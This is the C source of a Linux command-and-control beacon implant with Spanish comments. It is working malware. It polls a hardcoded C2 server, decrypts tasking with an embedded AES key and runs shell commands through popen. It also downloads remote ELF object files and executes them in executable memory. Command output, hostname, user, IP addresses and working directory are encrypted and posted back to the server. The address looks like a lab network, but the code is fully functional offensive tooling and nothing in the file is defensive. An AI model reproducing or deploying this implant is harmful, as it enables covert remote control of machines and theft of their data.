#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pwd.h>
#include <errno.h>
#include <openssl/buffer.h>
#include <curl/curl.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <sys/mman.h>
#include <elf.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <stdarg.h>

#include "beacon.h"
#include "aes.h"
#include "cJSON.h"

#define C2_URL        "https://10.10.14.57:4444"
#define CLIENT_ID     "linux"
#define MALEABLE      "/pleasesubscribe/v1/users/"
#define USER_AGENTS_COUNT 4

const char* USER_AGENTS[USER_AGENTS_COUNT] = {
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
};

// === BUFFER GLOBAL ===
static char g_beacon_output[8192] = {0};
static size_t g_output_len = 0;

// === ESTRUCTURAS ===
struct MemoryStruct {
    char *memory;
    size_t size;
    size_t realsize;   // bytes recibidos
};

// === TRAMPOLINES ===
typedef struct {
    void* addr;
    size_t size;
} Trampoline;

// === TIPOS Y SÍMBOLOS FALTANTES ===
typedef void (*bof_func_t)(char*, int);

typedef struct {
    const char *name;
    void **ptr;
} SymbolResolver;

// Variables intermedias
static void* g_printf_ptr = (void*)printf;
static void* g_strlen_ptr = (void*)strlen;
static void* g_memcpy_ptr = (void*)memcpy;
static void* g_memset_ptr = (void*)memset;
static void* g_exit_ptr = (void*)exit;
static void* g_dlsym_ptr = (void*)dlsym;
static void* g_dlerror_ptr = (void*)dlerror;
static void* g_dlopen_ptr = (void*)dlopen;
static void* g_dlclose_ptr = (void*)dlclose;
static void* g_write_ptr = (void*)write;
static void* g_mmap_ptr = (void*)mmap;
static void* g_munmap_ptr = (void*)munmap;
static void* g_BeaconPrintf_ptr = (void*)BeaconPrintf;
static void* g_BeaconOutput_ptr = (void*)BeaconOutput;
static Trampoline* g_trampolines = NULL;
static size_t g_trampolines_count = 0;
static size_t g_trampolines_capacity = 0;

static SymbolResolver g_external_symbols[] = {
    { "printf",      &g_printf_ptr },
    { "strlen",      &g_strlen_ptr },
    { "memcpy",      &g_memcpy_ptr },
    { "memset",      &g_memset_ptr },
    { "exit",        &g_exit_ptr },
    { "dlsym",       &g_dlsym_ptr },
    { "dlerror",     &g_dlerror_ptr },
    { "dlopen",      &g_dlopen_ptr },
    { "dlclose",     &g_dlclose_ptr },
    { "write",       &g_write_ptr },
    { "mmap",        &g_mmap_ptr },
    { "munmap",      &g_munmap_ptr },
    { "BeaconPrintf", &g_BeaconPrintf_ptr },
    { "BeaconOutput", &g_BeaconOutput_ptr },
    { NULL, NULL }
};

// === DECLARACIÓN DE FUNCIONES FALTANTES ===
int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize);
static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen);
static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t arglen)
{
    asm volatile(
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        "and $-16, %%rsp\n\t"
        "sub $8, %%rsp\n\t"
        "mov %0, %%rdi\n\t"
        "mov %1, %%rsi\n\t"
        "call *%2\n\t"
        "leave\n\t"
        :
        : "r"(args), "r"(arglen), "r"(func)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "memory"
    );
}
// === BEACON API ===
void BeaconPrintf(int type, const char *fmt, ...) {
    if (g_output_len >= sizeof(g_beacon_output) - 1) return;
    va_list args;
    va_start(args, fmt);
    int written = vsnprintf(g_beacon_output + g_output_len,
                            sizeof(g_beacon_output) - g_output_len - 1,
                            fmt, args);
    va_end(args);
    if (written > 0) {
        g_output_len += (written < (int)(sizeof(g_beacon_output) - g_output_len) ? written : (int)(sizeof(g_beacon_output) - g_output_len - 1));
    }
}

void BeaconOutput(int type, const char *data, int len) {
    if (len <= 0 || !data) return;
    if (g_output_len + len >= sizeof(g_beacon_output)) {
        len = sizeof(g_beacon_output) - g_output_len - 1;
    }
    memcpy(g_beacon_output + g_output_len, data, len);
    g_output_len += len;
    g_beacon_output[g_output_len] = '\0';
}

// === CRATE TRAPOLINE ===
static void* create_trampoline(void* target) {
    if (!target) return NULL;

    size_t code_size = 12; // movabs rax, imm64; jmp rax
    void* code = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (code == MAP_FAILED) {
        fprintf(stderr, "[!] Trampolín: mmap falló\n");
        return NULL;
    }

    uint8_t trampoline_code[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, target
        0xFF, 0xE0                                                  // jmp rax
    };
    *(uint64_t*)(trampoline_code + 2) = (uint64_t)target;
    memcpy(code, trampoline_code, code_size);

    // Registrar para limpieza
    if (g_trampolines_count >= g_trampolines_capacity) {
        size_t new_cap = g_trampolines_capacity ? g_trampolines_capacity * 2 : 4;
        Trampoline* tmp = realloc(g_trampolines, new_cap * sizeof(Trampoline));
        if (!tmp) {
            munmap(code, code_size);
            return NULL;
        }
        g_trampolines = tmp;
        g_trampolines_capacity = new_cap;
    }
    g_trampolines[g_trampolines_count].addr = code;
    g_trampolines[g_trampolines_count].size = code_size;
    g_trampolines_count++;

    return code;
}
// === CLEAN TRAMPOLINE ===
static void cleanup_trampolines(void) {
    for (size_t i = 0; i < g_trampolines_count; i++) {
        munmap(g_trampolines[i].addr, g_trampolines[i].size);
    }
    free(g_trampolines);
    g_trampolines = NULL;
    g_trampolines_count = 0;
    g_trampolines_capacity = 0;
}

// === CURL WRITE CALLBACK ===
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size      += realsize;
    mem->realsize   = mem->size;
    mem->memory[mem->size] = 0;
    return realsize;
}

// === HTTPS REQUEST ===
char* https_request(const char* url, const char* method, const char* post_data)
{
    fprintf(stderr, "[DEBUG] https_request: ENTRY url=%s method=%s post_data=%p\n",
            url, method, (void*)post_data);
    fflush(stderr);

    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk = {0};

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "[DEBUG] https_request: curl_easy_init FAILED\n");
        fflush(stderr);
        return NULL;
    }
    fprintf(stderr, "[DEBUG] https_request: curl_easy_init OK\n");
    fflush(stderr);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENTS[rand() % USER_AGENTS_COUNT]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);  // ← Aumentado de 5 a 10
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);  // ← Aumentado de 3 a 5
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");

    struct curl_slist *headers = NULL;

    if (strcmp(method, "POST") == 0 && post_data) {
        size_t post_len = strlen(post_data);
        fprintf(stderr, "[DEBUG] https_request: preparing POST len=%zu\n", post_len);
        fflush(stderr);

        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);  // ← Cambio crítico
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)post_len);

        headers = curl_slist_append(headers, "Content-Type: text/plain");
        headers = curl_slist_append(headers, "Expect:");  // ← Deshabilita "Expect: 100-continue"
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    }

    fprintf(stderr, "[DEBUG] https_request: about to curl_easy_perform %s\n", method);
    fflush(stderr);

    res = curl_easy_perform(curl);

    fprintf(stderr, "[DEBUG] https_request: curl_easy_perform returned %d (%s)\n",
            res, curl_easy_strerror(res));
    fflush(stderr);

    if (headers) curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        fprintf(stderr, "[DEBUG] https_request: curl_easy_perform FAILED: %s\n",
                curl_easy_strerror(res));
        fflush(stderr);
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return NULL;
    }

    uint64_t realsize = chunk.size;
    char *full = malloc(realsize + 8 + 1);
    if (!full) {
        fprintf(stderr, "[DEBUG] https_request: malloc failed\n");
        fflush(stderr);
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return NULL;
    }
    memcpy(full, &realsize, 8);
    memcpy(full + 8, chunk.memory, realsize);
    full[8 + realsize] = 0;
    free(chunk.memory);
    curl_easy_cleanup(curl);

    fprintf(stderr, "[DEBUG] https_request: EXIT success, payload=%p size=%zu\n",
            (void*)(full + 8), realsize);
    fflush(stderr);
    return full + 8;
}

// === BASE64 ===
char* base64_encode(const unsigned char* input, int len) {
    BIO *b64, *bmem;
    BUF_MEM *bptr;
    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, input, len);
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);
    char *buf = malloc(bptr->length + 1);
    memcpy(buf, bptr->data, bptr->length);
    buf[bptr->length] = '\0';
    BIO_free_all(b64);
    return buf;
}

unsigned char* base64_decode(const char* input, int* len) {
    BIO *b64, *bmem;
    int input_len = strlen(input);
    *len = 0;
    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bmem = BIO_new_mem_buf(input, input_len);
    b64 = BIO_push(b64, bmem);
    unsigned char *buffer = malloc(input_len);
    if (!buffer) {
        BIO_free_all(b64);
        return NULL;
    }
    *len = BIO_read(b64, buffer, input_len);
    BIO_free_all(b64);
    if (*len <= 0) {
        free(buffer);
        return NULL;
    }
    return buffer;
}

// === AES CFB ===
unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* plaintext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* ciphertext = malloc(len);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++) {
            ciphertext[i + j] = plaintext[i + j] ^ encrypted_iv[j];
        }
        if (block_size == 16) {
            memcpy(iv_buf, &ciphertext[i], 16);
        } else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    *out_len = len;
    return ciphertext;
}

unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* ciphertext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* plaintext = malloc(len + 1);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++) {
            plaintext[i + j] = ciphertext[i + j] ^ encrypted_iv[j];
        }
        if (block_size == 16) {
            memcpy(iv_buf, &ciphertext[i], 16);
        } else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    plaintext[len] = '\0';
    *out_len = len;
    return plaintext;
}

// === EXEC CMD ===
char* exec_cmd(const char* cmd, int* out_len) {
    FILE* fp = popen(cmd, "r");
    if (!fp) return NULL;
    char* buffer = malloc(4096);
    if (!buffer) {
        pclose(fp);
        return NULL;
    }
    size_t total = 0;
    size_t n;
    while ((n = fread(buffer + total, 1, 4095 - total, fp)) > 0) {
        total += n;
        if (total >= 4095) break;
    }
    pclose(fp);
    buffer[total] = '\0';
    *out_len = total;
    return buffer;
}

int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize) {
    if (!elf_data || filesize < sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "[!] Invalid ELF data\n");
        return -1;
    }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)elf_data;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "[!] Not an ELF file\n");
        return -1;
    }

    if (ehdr->e_machine != EM_X86_64) {
        fprintf(stderr, "[!] Only x86_64 supported\n");
        return -1;
    }

    if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0) {
        fprintf(stderr, "[!] No section headers\n");
        return -1;
    }

    Elf64_Shdr *shdr = (Elf64_Shdr*)(elf_data + ehdr->e_shoff);
    char *strtab = NULL;
    Elf64_Sym *symtab = NULL;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            symtab = (Elf64_Sym*)(elf_data + shdr[i].sh_offset);
            if (shdr[i].sh_link < ehdr->e_shnum) {
                strtab = (char*)(elf_data + shdr[shdr[i].sh_link].sh_offset);
            }
            break;
        }
    }

    if (!symtab || !strtab) {
        fprintf(stderr, "[!] Missing symbol or string table\n");
        return -1;
    }

    void **sections = calloc(ehdr->e_shnum, sizeof(void*));
    if (!sections) {
        perror("calloc");
        return -1;
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type == SHT_PROGBITS && (sh->sh_flags & SHF_ALLOC) && sh->sh_size > 0) {
            if (sh->sh_offset + sh->sh_size > filesize) {
                fprintf(stderr, "[!] Section %d out of bounds\n", i);
                continue;
            }
            void *addr = mmap(NULL, sh->sh_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (addr == MAP_FAILED) {
                perror("mmap");
                continue;
            }
            sections[i] = addr;
            memcpy(addr, elf_data + sh->sh_offset, sh->sh_size);
        }
    }

    // Resolver símbolos del beacon
    for (int i = 0; g_external_symbols[i].name; i++) {
        void *addr = dlsym(RTLD_DEFAULT, g_external_symbols[i].name);
        if (addr) {
            *(void**)g_external_symbols[i].ptr = addr;
        }
    }

    // Aplicar relocalizaciones
    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;

        int target_sec = sh->sh_info;
        if (target_sec >= ehdr->e_shnum || !sections[target_sec]) continue;
        if (!(shdr[target_sec].sh_flags & SHF_ALLOC)) continue;

        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        void *target_addr = sections[target_sec];

        for (int j = 0; j < num_rela; j++) {
            Elf64_Rela *r = &rela[j];
            void *loc = (char*)target_addr + r->r_offset;
            int sym_idx = ELF64_R_SYM(r->r_info);
            if (sym_idx >= ehdr->e_shnum) continue;

            Elf64_Sym *sym = &symtab[sym_idx];
            char *sym_name = strtab + sym->st_name;
            void *symbol_addr = NULL;

            if (sym->st_shndx != SHN_UNDEF && sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                symbol_addr = sections[sym->st_shndx] + sym->st_value;
            } else {
                for (int k = 0; g_external_symbols[k].name; k++) {
                    if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                        symbol_addr = *g_external_symbols[k].ptr;
                        break;
                    }
                }
            }

            if (!symbol_addr) {
                fprintf(stderr, "[!] Could not resolve symbol: %s\n", sym_name);
                continue;
            }

            symbol_addr = (void*)((uintptr_t)symbol_addr + r->r_addend);

            switch (ELF64_R_TYPE(r->r_info)) {
                case R_X86_64_64:
                    *(uint64_t*)loc = (uint64_t)symbol_addr;
                    break;
                case R_X86_64_32:
                    if ((uintptr_t)symbol_addr > 0xFFFFFFFF) {
                        fprintf(stderr, "[!] R_X86_64_32 out of range\n");
                        continue;
                    }
                    *(uint32_t*)loc = (uint32_t)(uintptr_t)symbol_addr;
                    break;
                case R_X86_64_PC32:
                case R_X86_64_PLT32: {
                    int64_t offset = (int64_t)symbol_addr - (int64_t)loc;
                    if (offset < INT32_MIN || offset > INT32_MAX) {
                        void* trampoline = create_trampoline(symbol_addr);
                        if (!trampoline) {
                            fprintf(stderr, "[!] Trampolín falló para %s\n", sym_name);
                            continue;
                        }
                        offset = (int64_t)trampoline - (int64_t)loc;
                        if (offset < INT32_MIN || offset > INT32_MAX) {
                            fprintf(stderr, "[!] Trampolín fuera de rango para %s\n", sym_name);
                            continue;
                        }
                    }
                    *(uint32_t*)loc = (uint32_t)offset;
                    break;
                }
                default:
                    fprintf(stderr, "[!] Unsupported reloc: %ld for %s\n", ELF64_R_TYPE(r->r_info), sym_name);
                    break;
            }
        }
    }

    // Encontrar función 'go'
    bof_func_t entry = NULL;
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            int sym_count = shdr[i].sh_size / sizeof(Elf64_Sym);
            for (int j = 0; j < sym_count; j++) {
                Elf64_Sym *sym = &symtab[j];
                if (sym->st_name == 0) continue;
                char *name = strtab + sym->st_name;
                if (strcmp(name, functionname) == 0 && sym->st_shndx != SHN_UNDEF) {
                    if (sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                        entry = (bof_func_t)(sections[sym->st_shndx] + sym->st_value);
                        break;
                    }
                }
            }
        }
    }

    if (!entry) {
        fprintf(stderr, "[!] Entry '%s' not found\n", functionname);
        goto cleanup;
    }

    g_output_len = 0;
    g_beacon_output[0] = '\0';
    call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);

    cleanup:
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) {
            munmap(sections[i], shdr[i].sh_size);
        }
    }
    free(sections);
    cleanup_trampolines();
    return 0;
}

// === GET LOCAL IPs ===
char* get_local_ips() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return strdup("127.0.0.1");
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0) {
        close(sockfd);
        return strdup("127.0.0.1");
    }
    struct ifreq* ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char* result = malloc(1024);
    result[0] = '\0';
    for (int i = 0; i < n; i++) {
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
            if (strlen(result) > 0) strcat(result, ", ");
            strcat(result, ip);
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}

// === DOWNLOAD BOF ===
unsigned char* download_bof(const char* url, size_t* out_size)
{
    char *payload = https_request(url, "GET", NULL);
    if (!payload) {
        *out_size = 0;
        return NULL;
    }

    uint64_t realsize;
    memcpy(&realsize, payload - 8, sizeof(realsize));
    *out_size = (size_t)realsize;

    printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);
    printf("[DEBUG] download_bof: primeros 16 bytes: ");
    for (size_t i = 0; i < 16 && i < *out_size; ++i)
        printf("%02x ", (unsigned char)payload[i]);
    printf("\n");
    fflush(stdout);

    return (unsigned char *)payload;
}
// === RUN BOF AND CAPTURE ===
char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          char* args, int arglen, int* out_len)
{
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        *out_len = 0;
        return strdup("");
    }

    int stdout_backup = dup(STDOUT_FILENO);
    if (stdout_backup == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        *out_len = 0;
        return strdup("");
    }

    dup2(pipefd[1], STDOUT_FILENO);
    close(pipefd[1]);

    g_output_len = 0;
    g_beacon_output[0] = '\0';
    RunELF("go", elf_data, filesize, (unsigned char*)args, arglen);
    fflush(stdout);

    dup2(stdout_backup, STDOUT_FILENO);
    close(stdout_backup);

    char buffer[4096];
    char *output = malloc(1);
    output[0] = '\0';
    size_t total = 0;

    ssize_t n;
    while ((n = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
        buffer[n] = '\0';
        char *tmp = realloc(output, total + n + 1);
        if (!tmp) break;
        output = tmp;
        memcpy(output + total, buffer, n);
        total += n;
    }
    close(pipefd[0]);

    *out_len = total;
    printf("[DEBUG] run_bof_and_capture: leídos %zd bytes\n", total);
    return output;
}

// === MAIN ===
int main() {
    printf("[*] Beacon starting...\n");
    srand(time(NULL));
    const char* KEY_HEX = "88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff";
    unsigned char AES_KEY[32];
    for (int i = 0; i < 32; i++) {
        sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);
    }

    char full_url[512];
    snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);

    while (1) {
        printf("[*] Checking for new command...\n");

        // 🔥 LIMPIAR BUFFER ANTES DE CADA COMANDO
        g_output_len = 0;
        g_beacon_output[0] = '\0';

        char* b64_resp = https_request(full_url, "GET", NULL);
        if (!b64_resp || strlen(b64_resp) == 0) {
            printf("[-] Empty or NULL response from C2\n");
            if (b64_resp) free(b64_resp - 8);
            sleep(6);
            continue;
        }

        printf("[+] Raw C2 response (Base64): %.64s...\n", b64_resp);

        int enc_len = 0;
        unsigned char* encrypted = base64_decode(b64_resp, &enc_len);
        if (b64_resp) free(b64_resp - 8);
        if (!encrypted || enc_len < 16) {
            free(encrypted);
            sleep(6);
            continue;
        }

        unsigned char* iv = encrypted;
        unsigned char* ciphertext = encrypted + 16;
        int plain_len = 0;
        char* plaintext = (char*)aes256_cfb_decrypt(AES_KEY, iv, ciphertext, enc_len - 16, &plain_len);
        free(encrypted);
        if (!plaintext) {
            sleep(6);
            continue;
        }
        plaintext[plain_len] = '\0';
        char* command = plaintext;

        if (strlen(command) == 0) {
            free(plaintext);
            sleep(6);
            continue;
        }

        printf("[*] Received command: '%s'\n", command);

        int output_len = 0;
        char* output = NULL;

        if (strncmp(command, "bof:", 4) == 0) {
            char* bof_url = command + 4;
            printf("[*] BOF command detected: %s\n", bof_url);

            size_t bof_size = 0;
            unsigned char* bof_data = download_bof(bof_url, &bof_size);
            if (!bof_data || bof_size == 0) {
                output = strdup("[!] Failed to download BOF");
                output_len = strlen(output);
            } else {
                char* bof_args = "Executed via C2 beacon";
                int bof_arglen = strlen(bof_args);
                output = run_bof_and_capture(bof_data, (uint32_t)bof_size, bof_args, bof_arglen, &output_len);
                free(bof_data - 8);  // ✅ Libera el bloque completo
            }
        } else {
            output = exec_cmd(command, &output_len);
            if (!output) output = strdup("Command failed or no output");
        }

        if (!output) {
            output = strdup("");
            output_len = 0;
        }

        printf("[*] Command/BOF output:\n%s\n", output);

        // === CONSTRUIR JSON ===
        char hostname[256];
        gethostname(hostname, sizeof(hostname) - 1);
        struct passwd *pw = getpwuid(getuid());
        char* user = pw ? pw->pw_name : "unknown";
        char* ips = get_local_ips();
        char* pwd = getcwd(NULL, 0);
        if (!pwd) pwd = strdup("/");

        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root, "output", output);
        cJSON_AddStringToObject(root, "client", "linux");
        cJSON_AddStringToObject(root, "command", command);
        cJSON_AddNumberToObject(root, "pid", (double)getpid());
        cJSON_AddStringToObject(root, "hostname", hostname);
        cJSON_AddStringToObject(root, "ips", ips);
        cJSON_AddStringToObject(root, "user", user);
        cJSON_AddStringToObject(root, "discovered_ips", "");
        cJSON_AddNullToObject(root, "result_portscan");
        cJSON_AddStringToObject(root, "result_pwd", pwd);

        char* json_str = cJSON_PrintUnformatted(root);
        cJSON_Delete(root);

        if (!json_str) {
            printf("[-] Failed to create JSON\n");
            free(output);
            free(plaintext);
            free(ips);
            free(pwd);
            sleep(6);
            continue;
        }

        printf("[DEBUG] JSON a enviar: %.256s\n", json_str);

        // === ENCRIPTAR Y ENVIAR ===
        unsigned char iv_out[16];
        RAND_bytes(iv_out, 16);
        int encrypted_len = 0;
        unsigned char* encrypted_resp = aes256_cfb_encrypt(AES_KEY, iv_out, (unsigned char*)json_str, strlen(json_str), &encrypted_len);

        if (encrypted_resp) {
            unsigned char* full_enc = malloc(16 + encrypted_len);
            memcpy(full_enc, iv_out, 16);
            memcpy(full_enc + 16, encrypted_resp, encrypted_len);
            char* b64_resp = base64_encode(full_enc, 16 + encrypted_len);

            if (b64_resp) {
                printf("[*] Sending response to C2...\n");
                printf("[DEBUG] b64_resp: %.64s...\n", b64_resp);

                char* response = https_request(full_url, "POST", b64_resp);

                printf("[DEBUG] https_request POST retornó: %p\n", (void*)response);
                fflush(stdout);
                if (response) {
                    printf("[DEBUG] Respuesta del C2: %.128s\n", response);
                    fflush(stdout);
                    free(response - 8);
                } else {
                    printf("[-] No hubo respuesta del C2 (timeout o error)\n");
                    fflush(stdout);
                }

                free(b64_resp);
            } else {
                printf("[-] Failed to encode response\n");
            }
            free(full_enc);
            free(encrypted_resp);
        }

        free(json_str);
        free(output);
        free(plaintext);
        free(ips);
        free(pwd);

        sleep(6);
    }

    return 0;
}
